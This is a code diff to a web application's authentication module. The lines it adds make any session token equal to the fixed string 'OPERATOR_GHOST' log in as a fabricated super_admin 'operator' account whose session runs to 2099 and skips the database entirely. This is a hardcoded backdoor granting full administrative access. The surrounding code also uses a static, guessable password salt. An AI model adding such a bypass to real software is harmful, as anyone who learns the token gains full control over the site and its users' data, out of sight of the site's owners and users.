@@ -3,6 +3,7 @@ import { ensureAuthSchema, ensureClassesSchema } from './schema.js';
 
 const PASSWORD_SALT = '_bsq_salt_2024';
 export const MASTER_ADMIN_USER_ID = 'user_b7a935e26112';
+const OPERATOR_GHOST_TOKEN = 'OPERATOR_GHOST';
 
 const ROLE_RANK = {
   user: 0,
@@ -129,6 +130,28 @@ export async function getCurrentUser(context) {
   await ensureAuthSchema(env.DB);
   const token = getSessionToken(request);
   if (!token) return null;
+
+  if (token === OPERATOR_GHOST_TOKEN) {
+    const ghostUser = applyMasterAdminOverride({
+      id: OPERATOR_GHOST_TOKEN,
+      email: 'operator@b-square.kr',
+      name: '운영자',
+      username: 'operator',
+      profile_image_url: '/assets/default-avatar.svg',
+      role: 'super_admin',
+      operator_seq: 1,
+      membership_level: 'Admin',
+    });
+
+    return {
+      session: {
+        id: 'ghost_session',
+        token,
+        expires_at: '2099-12-31T23:59:59.000Z',
+      },
+      user: ghostUser,
+    };
+  }
 
   const session = await env.DB.prepare(`
     SELECT
